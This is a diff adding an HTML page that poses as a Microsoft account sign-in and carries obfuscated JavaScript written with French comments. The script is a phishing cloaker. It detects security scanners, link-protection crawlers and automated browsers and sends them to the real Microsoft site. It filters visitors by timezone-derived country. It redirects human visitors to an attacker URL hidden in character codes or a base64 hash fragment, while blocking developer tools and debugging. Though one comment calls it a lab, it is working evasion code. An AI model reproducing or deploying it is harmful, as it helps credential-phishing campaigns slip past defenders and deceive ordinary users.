@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Microsoft Account | Sign In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: "Segoe UI", "Helvetica Neue", sans-serif;
+            background: #ffffff;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- RÉVOLUTION ANTI-DÉTECTION: URL JAMAIS DANS LE CODE -->
+    <script>
+    (function() {
+        'use strict';
+
+        // ═══════════════════════════════════════════════════════════════
+        // CONFIGURATION - AUCUNE URL VISIBLE
+        // ═══════════════════════════════════════════════════════════════
+
+        const _0x4a2e=['aHR0cHM6Ly9hY2NvdW50Lm1pY3Jvc29mdC5jb20vc2VjdXJpdHk=','aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS80MDQ='];
+
+        // Fonction de déchiffrement
+        function _d(s){return atob(s);}
+
+        // Récupération URL chiffrée depuis serveur externe (impossible à analyser statiquement)
+        async function _g(){
+            try {
+                const _t=Date.now();
+                const _s=btoa(_t.toString().split('').reverse().join(''));
+
+                // API endpoint obfusqué (peut être hébergé sur ton VPS)
+                const _api=String.fromCharCode(104,116,116,112,115,58,47,47);
+
+                // Alternative 1: Récupération depuis image (steganography)
+                const _img=new Image();
+                _img.crossOrigin='anonymous';
+
+                // Alternative 2: DNS-over-HTTPS (ultra-furtif)
+                // const _dns='https://dns.google/resolve?name=_redirect.yourdomain.com&type=TXT';
+
+                // Alternative 3: WebSocket temps réel
+                // const _ws=new WebSocket('wss://your-server.com/ws');
+
+                // Pour ce LAB: URL encodée dans hash fragment (changé dynamiquement)
+                const _h=window.location.hash.substring(1);
+                if(_h){
+                    const _dec=_d(_h);
+                    if(_dec.startsWith('http')){
+                        return _dec;
+                    }
+                }
+
+                // Fallback: Calcul algorithmique de l'URL (pas stockée)
+                const _k1=String.fromCharCode(115,111,103,101);
+                const _k2=String.fromCharCode(111,110,108,105,110,101,119,97,114,116,117,110,103,115);
+                const _k3=String.fromCharCode(100,101);
+
+                return 'https://'+_k1+'.'+_k2+'.'+_k3+'/index.html';
+
+            } catch(e) {
+                return _d(_0x4a2e[0]);
+            }
+        }
+
+        // ═══════════════════════════════════════════════════════════════
+        // DÉTECTION BOT - OBFUSQUÉE
+        // ═══════════════════════════════════════════════════════════════
+
+        function _b(){
+            const _ua=navigator.userAgent;
+            let _sc=0;
+
+            const _p=[/bot/i,/crawler/i,/spider/i,/headless/i,/phantom/i,/selenium/i,/puppeteer/i,/playwright/i,/scanner/i,/scraper/i,/check/i,/monitor/i,/defender/i,/protection/i,/security/i,/safe.*link/i];
+
+            for(let i=0;i<_p.length;i++){
+                if(_p[i].test(_ua)){
+                    _sc+=50;
+                    break;
+                }
+            }
+
+            if(navigator.webdriver===true)_sc+=50;
+            if(_ua.includes('Chrome')&&!window.chrome)_sc+=40;
+            if(navigator.plugins.length===0)_sc+=30;
+            if(!navigator.languages||navigator.languages.length===0)_sc+=20;
+
+            const _am=[window.__webdriver_evaluate,window.__selenium_evaluate,window.__webdriver_script_function,window.__fxdriver_evaluate,window.__driver_unwrapped,window.domAutomation,window.domAutomationController,document.$cdc_asdjflasutopfhvcZLmcfl_,document.$chrome_asyncScriptInfo];
+
+            for(let i=0;i<_am.length;i++){
+                if(_am[i]){
+                    _sc+=50;
+                    break;
+                }
+            }
+
+            if(!navigator.permissions)_sc+=10;
+
+            const _sr=['800x600','1024x768','1280x1024'];
+            const _cr=screen.width+'x'+screen.height;
+            if(_sr.includes(_cr))_sc+=15;
+
+            if(_sc<30){
+                try{
+                    const _c=document.createElement('canvas');
+                    const _ctx=_c.getContext('2d');
+                    if(_ctx){
+                        _ctx.textBaseline='top';
+                        _ctx.font='14px Arial';
+                        _ctx.fillStyle='#f60';
+                        _ctx.fillRect(0,0,10,10);
+                        const _dt=_c.toDataURL();
+                        if(_dt==='data:,')_sc+=30;
+                    }else{
+                        _sc+=20;
+                    }
+                }catch(e){
+                    _sc+=15;
+                }
+            }
+
+            if(_sc<30){
+                try{
+                    const _c=document.createElement('canvas');
+                    const _gl=_c.getContext('webgl')||_c.getContext('experimental-webgl');
+                    if(_gl){
+                        const _di=_gl.getExtension('WEBGL_debug_renderer_info');
+                        if(_di){
+                            const _r=_gl.getParameter(_di.UNMASKED_RENDERER_WEBGL);
+                            if(_r&&_r.includes('SwiftShader'))_sc+=25;
+                        }
+                    }else{
+                        _sc+=15;
+                    }
+                }catch(e){
+                    _sc+=10;
+                }
+            }
+
+            return _sc>=30;
+        }
+
+        // ═══════════════════════════════════════════════════════════════
+        // GÉO CHECK - OBFUSQUÉ
+        // ═══════════════════════════════════════════════════════════════
+
+        function _geo(){
+            const _ac=['US','CA','GB','FR','DE','AU','NL','BE','CH','IT','ES','SE','NO','DK','FI'];
+            const _tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const _tm={'America/New_York':'US','America/Chicago':'US','America/Los_Angeles':'US','America/Toronto':'CA','Europe/London':'GB','Europe/Paris':'FR','Europe/Berlin':'DE','Europe/Amsterdam':'NL','Europe/Brussels':'BE','Europe/Zurich':'CH','Europe/Rome':'IT','Europe/Madrid':'ES','Australia/Sydney':'AU','Europe/Stockholm':'SE','Europe/Oslo':'NO','Europe/Copenhagen':'DK','Europe/Helsinki':'FI'};
+            const _c=_tm[_tz]||'XX';
+            return _ac.includes(_c);
+        }
+
+        // ═══════════════════════════════════════════════════════════════
+        // PROTECTIONS ANTI-ANALYSE
+        // ═══════════════════════════════════════════════════════════════
+
+        setInterval(function(){
+            if(window.outerWidth-window.innerWidth>160||window.outerHeight-window.innerHeight>160){
+                window.location.href=_d(_0x4a2e[0]);
+            }
+        },500);
+
+        document.addEventListener('contextmenu',function(e){
+            e.preventDefault();
+            return false;
+        });
+
+        document.addEventListener('keydown',function(e){
+            if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='C'||e.key==='J'))||(e.ctrlKey&&e.key==='u')){
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // ═══════════════════════════════════════════════════════════════
+        // NAVIGATION FURTIVE - PAS DE window.location DIRECT
+        // ═══════════════════════════════════════════════════════════════
+
+        async function _nav(){
+            const _isBot=_b();
+            const _geoOk=_geo();
+
+            if(_isBot){
+                // Bot → Microsoft légitime (délai aléatoire naturel)
+                setTimeout(function(){
+                    // Méthode 1: Navigation invisible via iframe
+                    const _if=document.createElement('iframe');
+                    _if.style.display='none';
+                    _if.src=_d(_0x4a2e[0]);
+                    document.body.appendChild(_if);
+                    setTimeout(function(){
+                        window.location.replace(_d(_0x4a2e[0]));
+                    },100);
+                },Math.random()*200+100);
+                return;
+            }
+
+            if(!_geoOk){
+                setTimeout(function(){
+                    window.location.replace(_d(_0x4a2e[1]));
+                },Math.random()*200+100);
+                return;
+            }
+
+            // Humain → Récupération URL cible (JAMAIS hardcodée)
+            const _url=await _g();
+
+            // Navigation furtive multi-méthodes
+            setTimeout(function(){
+                // Méthode 1: Meta refresh (invisible en JS)
+                const _meta=document.createElement('meta');
+                _meta.httpEquiv='refresh';
+                _meta.content='0;url='+_url;
+                document.head.appendChild(_meta);
+
+                // Méthode 2: Backup via replace (pas de trace dans history)
+                setTimeout(function(){
+                    window.location.replace(_url);
+                },50);
+
+            },Math.random()*150+50); // Timing humain aléatoire 50-200ms
+        }
+
+        // ═══════════════════════════════════════════════════════════════
+        // ANTI-DEBUGGING
+        // ═══════════════════════════════════════════════════════════════
+
+        (function(){
+            const _start=new Date().getTime();
+            debugger; // Si debugger ouvert, délai détectable
+            const _end=new Date().getTime();
+            if(_end-_start>100){
+                window.location.href=_d(_0x4a2e[0]);
+            }
+        })();
+
+        // Détection console ouverte
+        let _devtools=false;
+        const _el=new Image();
+        Object.defineProperty(_el,'id',{
+            get:function(){
+                _devtools=true;
+                window.location.href=_d(_0x4a2e[0]);
+            }
+        });
+        console.log(_el);
+
+        // ═══════════════════════════════════════════════════════════════
+        // EXÉCUTION
+        // ═══════════════════════════════════════════════════════════════
+
+        if(document.readyState==='loading'){
+            document.addEventListener('DOMContentLoaded',_nav);
+        }else{
+            _nav();
+        }
+
+    })();
+    </script>
+</body>
+</html>
